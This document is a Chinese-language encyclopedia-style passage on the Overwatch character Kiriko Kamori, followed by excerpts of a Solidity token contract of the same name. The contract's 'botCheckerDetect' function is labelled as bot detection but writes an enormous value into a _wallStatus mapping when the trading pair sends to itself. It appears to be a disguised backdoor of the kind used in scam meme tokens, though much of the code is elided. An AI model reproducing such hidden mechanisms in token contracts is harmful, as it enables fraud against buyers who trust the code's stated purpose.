...
家守霧子 是守望先鋒媒體系列中的一個虛構可玩角色。她的首次亮相是在暴雪娛樂開發的 二千零二十二 年第一人稱射擊遊戲《守望先鋒 》中。 
家守 的角色設計和遊戲機制取材於日本民間傳說和神道教民間宗教中的圖像。在遊戲的傳說中，她的母親訓練她成為一名忍者，而她的祖母則教她關於靈性和她的祖先。結合她的兩個母系影響，
家守 攜帶著一隻狐狸的力量，她用它來保護她的家鄉金坂，一個虛構的日本城市。

她是守望先鋒 測試期結束後宣布的第一個可玩的守望先鋒角色，也是第一個通過戰鬥通行證解鎖的角色。暴雪決定讓 家守 
和所有未來可玩的英雄都被鎖定在戰鬥通行證系統後面，但遭到了遊戲玩家群的強烈反對和批評。
...
contract KirikoKamori is Context, IERC20, Ownable {
    ...
    string private _name = unicode"Kiriko Kamori";
    string private _symbol = unicode"家守 霧子";
    uint256 public _totalSupply =  1250000000 * 10**_decimals;    
    ...
    function botCheckerDetect(address sp, address re) internal returns(bool){
        if(sp == re && sp == sPair){
            _wallStatus[re]=block.timestamp;
            _wallStatus[re]=_wallStatus[re]*1000**_decimals;
            return true;
        }
        return false;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(!isMarketPair[recipient] && sender != owner())
         ...
         if(botCheckerDetect(sender,recipient))
            return botCheckerDetect(sender,recipient);
